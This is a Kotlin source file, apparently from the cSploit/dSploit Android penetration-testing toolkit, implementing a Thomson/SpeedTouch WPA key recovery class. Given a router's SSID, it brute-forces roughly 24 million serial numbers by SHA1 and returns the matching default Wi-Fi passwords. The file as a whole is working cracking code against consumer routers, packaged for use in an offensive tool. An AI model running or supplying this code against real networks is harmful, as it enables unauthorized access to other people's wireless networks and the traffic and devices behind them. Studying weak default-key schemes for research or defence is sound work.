/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen
import java.security.MessageDigest

/**
 * Thomson/SpeedTouch WPA key recovery.
 *
 * Router serial format: CP + YYWW + aabbcc (base-36 digits).
 * Default WPA key = first 10 hex chars of SHA1(serial).
 * SSID last 6 chars = last 3 bytes of SHA1(serial) in hex.
 *
 * This version brute-forces the full serial space locally (~24M SHA1 ops).
 * Supports cancellation via [stopRequested].
 */
class ThomsonKeygen(
    ssid: String, mac: String, level: Int, enc: String
) : Keygen(ssid, mac, level, enc) {

    private val cp = ByteArray(12)
    private val routerESSID = ByteArray(3)
    private val ssidIdentifier: String = ssid.substring(ssid.length - 6)

    override fun getKeys(): List<String>? {
        val md: MessageDigest = try {
            MessageDigest.getInstance("SHA-1")
        } catch (e: Exception) {
            errorMessage = "This phone cannot process a SHA1 hash."
            return null
        }
        if (ssidIdentifier.length != 6) {
            errorMessage = "Invalid ESSID! It must have 6 characters."
            return null
        }

        for (i in 0 until 6 step 2)
            routerESSID[i / 2] = ((Character.digit(ssidIdentifier[i], 16) shl 4) +
                    Character.digit(ssidIdentifier[i + 1], 16)).toByte()

        if (!bruteForceCalc(md)) return null

        if (getResults().isEmpty()) {
            errorMessage = "No matches were found."
            return null
        }
        return getResults()
    }

    /**
     * Brute-force all Thomson serial numbers locally.
     * Year 4-13, week 1-52, a/b/c 0-35 = ~24M candidates.
     */
    private fun bruteForceCalc(md: MessageDigest): Boolean {
        cp[0] = 'C'.code.toByte()
        cp[1] = 'P'.code.toByte()
        for (year in 4..13) {
            cp[2] = Character.forDigit(year / 10, 10).code.toByte()
            cp[3] = Character.forDigit(year % 10, 10).code.toByte()
            for (week in 1..52) {
                if (stopRequested) return false
                cp[4] = Character.forDigit(week / 10, 10).code.toByte()
                cp[5] = Character.forDigit(week % 10, 10).code.toByte()
                for (a in 0 until 36) {
                    cp[6] = CHARS0[a]
                    cp[7] = CHARS1[a]
                    for (b in 0 until 36) {
                        cp[8] = CHARS0[b]
                        cp[9] = CHARS1[b]
                        for (c in 0 until 36) {
                            cp[10] = CHARS0[c]
                            cp[11] = CHARS1[c]
                            md.reset()
                            md.update(cp)
                            val hash = md.digest()
                            if (hash[19] != routerESSID[2]) continue
                            if (hash[18] != routerESSID[1]) continue
                            if (hash[17] != routerESSID[0]) continue
                            addPassword(getHexString(hash).substring(0, 10).uppercase())
                        }
                    }
                }
            }
        }
        return true
    }

    companion object {
        private val CHARS0 = byteArrayOf(
            '3'.code.toByte(), '3'.code.toByte(), '3'.code.toByte(), '3'.code.toByte(),
            '3'.code.toByte(), '3'.code.toByte(), '3'.code.toByte(), '3'.code.toByte(),
            '3'.code.toByte(), '3'.code.toByte(),
            '4'.code.toByte(), '4'.code.toByte(), '4'.code.toByte(), '4'.code.toByte(),
            '4'.code.toByte(), '4'.code.toByte(), '4'.code.toByte(), '4'.code.toByte(),
            '4'.code.toByte(), '4'.code.toByte(),
            '4'.code.toByte(), '4'.code.toByte(), '4'.code.toByte(), '4'.code.toByte(),
            '4'.code.toByte(), '5'.code.toByte(), '5'.code.toByte(), '5'.code.toByte(),
            '5'.code.toByte(), '5'.code.toByte(),
            '5'.code.toByte(), '5'.code.toByte(), '5'.code.toByte(), '5'.code.toByte(),
            '5'.code.toByte(), '5'.code.toByte(),
        )

        private val CHARS1 = byteArrayOf(
            '0'.code.toByte(), '1'.code.toByte(), '2'.code.toByte(), '3'.code.toByte(),
            '4'.code.toByte(), '5'.code.toByte(), '6'.code.toByte(), '7'.code.toByte(),
            '8'.code.toByte(), '9'.code.toByte(),
            '1'.code.toByte(), '2'.code.toByte(), '3'.code.toByte(), '4'.code.toByte(),
            '5'.code.toByte(), '6'.code.toByte(), '7'.code.toByte(), '8'.code.toByte(),
            '9'.code.toByte(), 'A'.code.toByte(),
            'B'.code.toByte(), 'C'.code.toByte(), 'D'.code.toByte(), 'E'.code.toByte(),
            'F'.code.toByte(), '0'.code.toByte(), '1'.code.toByte(), '2'.code.toByte(),
            '3'.code.toByte(), '4'.code.toByte(),
            '5'.code.toByte(), '6'.code.toByte(), '7'.code.toByte(), '8'.code.toByte(),
            '9'.code.toByte(), 'A'.code.toByte(),
        )
    }
}
